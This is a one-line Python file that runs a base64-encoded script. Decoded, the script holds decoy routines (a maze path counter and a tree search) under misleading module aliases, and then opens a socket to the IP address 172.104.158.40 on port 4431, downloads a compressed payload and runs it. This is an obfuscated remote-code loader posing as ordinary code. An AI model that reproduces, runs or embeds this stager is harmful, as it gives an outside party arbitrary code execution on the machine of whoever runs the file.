exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCBhcyBzZWN1cnp5CmltcG9ydCB6bGliIGFzIGdvb2dsZQppbXBvcnQgYmFzZTY0IGFzIG1hdGg3MAppbXBvcnQgc3RydWN0IGFzIGZpcmVleWUKaW1wb3J0IHRpbWUgYXMgY2lzY28KClIgPSA0CkMgPSA0CgojIFJldHVybnMgY291bnQgb2YgcG9zc2libGUgcGF0aHMgaW4gYQojIG1hemVbUl1bQ10gZnJvbSAoMCwwKSB0byAoUi0xLEMtMSkKZGVmIGNvdW50UGF0aHMobWF6ZSk6CiAgICAjIElmIHRoZSBpbml0aWFsIGNlbGwgaXMgYmxvY2tlZCwKICAgICMgdGhlcmUgaXMgbm8gd2F5IG9mIG1vdmluZyBhbnl3aGVyZQogICAgaWYgKG1hemVbMF1bMF0gPT0gLTEpOgogICAgICAgIHJldHVybiAwCgogICAgIyBJbml0aWFsaXppbmcgdGhlIGxlZnRtb3N0IGNvbHVtbgogICAgZm9yIGkgaW4gcmFuZ2UoUik6CiAgICAgICAgaWYgKG1hemVbaV1bMF0gPT0gMCk6CiAgICAgICAgICAgIG1hemVbaV1bMF0gPSAxCgogICAgICAgICMgSWYgd2UgZW5jb3VudGVyIGEgYmxvY2tlZCBjZWxsIGluCiAgICAgICAgIyBsZWZ0bW9zdCByb3csIHRoZXJlIGlzIG5vIHdheSBvZgogICAgICAgICMgdmlzaXRpbmcgYW55IGNlbGwgZGlyZWN0bHkgYmVsb3cgaXQuCiAgICAgICAgZWxzZToKICAgICAgICAgICAgYnJlYWsKCiAgICAjIFNpbWlsYXJseSBpbml0aWFsaXplIHRoZSB0b3Btb3N0IHJvdwogICAgZm9yIGkgaW4gcmFuZ2UoMSwgQywgMSk6CiAgICAgICAgaWYgKG1hemVbMF1baV0gPT0gMCk6CiAgICAgICAgICAgIG1hemVbMF1baV0gPSAxCgogICAgICAgICMgSWYgd2UgZW5jb3VudGVyIGEgYmxvY2tlZCBjZWxsIGluCiAgICAgICAgIyBib3R0b21tb3N0IHJvdywgdGhlcmUgaXMgbm8gd2F5IG9mCiAgICAgICAgIyB2aXNpdGluZyBhbnkgY2VsbCBkaXJlY3RseSBiZWxvdyBpdC4KICAgICAgICBlbHNlOgogICAgICAgICAgICBicmVhawoKICAgICMgVGhlIG9ubHkgZGlmZmVyZW5jZSBpcyB0aGF0IGlmIGEgY2VsbCBpcyAtMSwKICAgICMgc2ltcGx5IGlnbm9yZSBpdCBlbHNlIHJlY3Vyc2l2ZWx5IGNvbXB1dGUKICAgICMgY291bnQgdmFsdWUgbWF6ZVtpXVtqXQogICAgZm9yIGkgaW4gcmFuZ2UoMSwgUiwgMSk6CiAgICAgICAgZm9yIGogaW4gcmFuZ2UoMSwgQywgMSk6CgogICAgICAgICAgICAjIElmIGJsb2NrYWdlIGlzIGZvdW5kLCBpZ25vcmUgdGhpcyBjZWxsCiAgICAgICAgICAgIGlmIChtYXplW2ldW2pdID09IC0xKToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICAjIElmIHdlIGNhbiByZWFjaCBtYXplW2ldW2pdIGZyb20KICAgICAgICAgICAgIyBtYXplW2ktMV1bal0gdGhlbiBpbmNyZW1lbnQgY291bnQuCiAgICAgICAgICAgIGlmIChtYXplW2kgLSAxXVtqXSA+IDApOgogICAgICAgICAgICAgICAgbWF6ZVtpXVtqXSA9IChtYXplW2ldW2pdICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWF6ZVtpIC0gMV1bal0pCgogICAgICAgICAgICAjIElmIHdlIGNhbiByZWFjaCBtYXplW2ldW2pdIGZyb20KICAgICAgICAgICAgIyBtYXplW2ldW2otMV0gdGhlbiBpbmNyZW1lbnQgY291bnQuCiAgICAgICAgICAgIGlmIChtYXplW2ldW2ogLSAxXSA+IDApOgogICAgICAgICAgICAgICAgbWF6ZVtpXVtqXSA9IChtYXplW2ldW2pdICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWF6ZVtpXVtqIC0gMV0pCgogICAgIyBJZiB0aGUgZmluYWwgY2VsbCBpcyBibG9ja2VkLAogICAgIyBvdXRwdXQgMCwgb3RoZXJ3aXNlIHRoZSBhbnN3ZXIKICAgIGlmIChtYXplW1IgLSAxXVtDIC0gMV0gPiAwKToKICAgICAgICByZXR1cm4gbWF6ZVtSIC0gMV1bQyAtIDFdCiAgICBlbHNlOgogICAgICAgIHJldHVybiAwCgoKIyBEcml2ZXIgY29kZQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbWF6ZSA9IFtbMCwgMCwgMCwgMF0sCiAgICAgICAgICAgIFswLCAtMSwgMCwgMF0sCiAgICAgICAgICAgIFstMSwgMCwgMCwgMF0sCiAgICAgICAgICAgIFswLCAwLCAwLCAwXV0KICAgIHByaW50KGNvdW50UGF0aHMobWF6ZSkpCgoKZGVmIHNlYXJjaChoZWxsbywga2V5KToKICAgICMgQmFzZSBDYXNlczogIGlzIG51bGwgb3Iga2V5IGlzIHByZXNlbnQKICAgIGlmIGhlbGxvIGlzIE5vbmUgb3IgaGVsbG8udmFsID09IGtleToKICAgICAgICByZXR1cm4gaGVsbG8KCiAgICAjIEtleSBpcyBncmVhdGVyCiAgICBpZiBoZWxsby52YWwgPCBrZXk6CiAgICAgICAgcmV0dXJuIHNlYXJjaChoZWxsby5yaWdodCwga2V5KQoKICAgICMgS2V5IGlzIHNtYWxsZXIKICAgIHJldHVybiBzZWFyY2goaGVsbG8ubGVmdCwga2V5KQoKCmZvciBjb3VudGVyIGluIHJhbmdlKDgpOgogICAgdHJ5OgogICAgICAgIGRvdGhlbWF0aCA9IHNlY3Vyenkuc29ja2V0KDIsIHNlY3VyenkuU09DS19TVFJFQU0pCiAgICAgICAgZG90aGVtYXRoLmNvbm5lY3QoKCcxNzIuMTA0LjE1OC40MCcsIDQ0MzEpKQogICAgICAgIGJyZWFrCiAgICBleGNlcHQ6CiAgICAgICAgY2lzY28uc2xlZXAoNSkKCnBsdXMgPSBmaXJlZXllLnVucGFjaygnPkknLCBkb3RoZW1hdGgucmVjdig0KSlbMF0KbWludXMgPSBkb3RoZW1hdGgucmVjdihwbHVzKQp3aGlsZSBsZW4obWludXMpIDwgcGx1czoKICAgIG1pbnVzICs9IGRvdGhlbWF0aC5yZWN2KHBsdXMgLSBsZW4obWludXMpKQpleGVjKGdvb2dsZS5kZWNvbXByZXNzKG1hdGg3MC5iNjRkZWNvZGUobWludXMpKSwgeydzJzogZG90aGVtYXRofSkK')[0]))
